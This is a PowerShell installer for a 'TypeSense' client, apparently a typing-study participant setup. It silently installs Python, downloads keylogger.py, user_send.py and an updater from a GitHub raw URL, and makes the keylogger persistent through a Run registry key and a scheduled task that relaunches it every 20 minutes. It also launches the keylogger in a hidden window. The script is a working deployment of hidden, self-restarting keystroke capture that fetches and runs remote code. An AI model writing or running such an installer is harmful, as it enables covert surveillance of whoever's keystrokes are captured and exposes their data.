# TypeSense - participant setup: downloads the client into %LOCALAPPDATA%\Programs\TypeSense, installs deps, registers autostart, launches.
$ErrorActionPreference = "Stop"
$raw = "https://raw.githubusercontent.com/ricewas-mis-taken/TypeSense/main"
$dir = Join-Path $env:LOCALAPPDATA "Programs\TypeSense"
New-Item -ItemType Directory -Force $dir | Out-Null

$ver = $null
$py = Get-Command python -ErrorAction SilentlyContinue
if ($py) { $ver = & python -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>$null }
if (-not $ver -or [version]$ver -lt [version]"3.10" -or [version]$ver -ge [version]"3.14") {
    winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
    $env:Path = [Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [Environment]::GetEnvironmentVariable("Path","User")
}

foreach ($f in "keylogger.py","survey.py","user_send.py","updater.py","app_paths.py","version.py","requirements.txt") {
    Invoke-WebRequest "$raw/$f" -OutFile (Join-Path $dir $f) -UseBasicParsing
}

python -m pip install --upgrade pip --quiet
python -m pip install -r (Join-Path $dir "requirements.txt") --quiet
if ($LASTEXITCODE -ne 0) { throw "Dependency install failed - nothing was registered." }

$pythonw = Join-Path (Split-Path (Get-Command python).Source) "pythonw.exe"
if (-not (Test-Path $pythonw)) { $pythonw = (Get-Command python).Source }
$script = Join-Path $dir "keylogger.py"
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TypeSenseLogger" -Value "`"$pythonw`" `"$script`""
schtasks /Create /F /TN "TypeSenseLoggerWatchdog" /TR "`"$pythonw`" `"$script`"" /SC MINUTE /MO 20 | Out-Null
Start-Process $pythonw -ArgumentList "`"$script`"" -WorkingDirectory $dir -WindowStyle Hidden
Write-Host "TypeSense is running and will restart on every login."
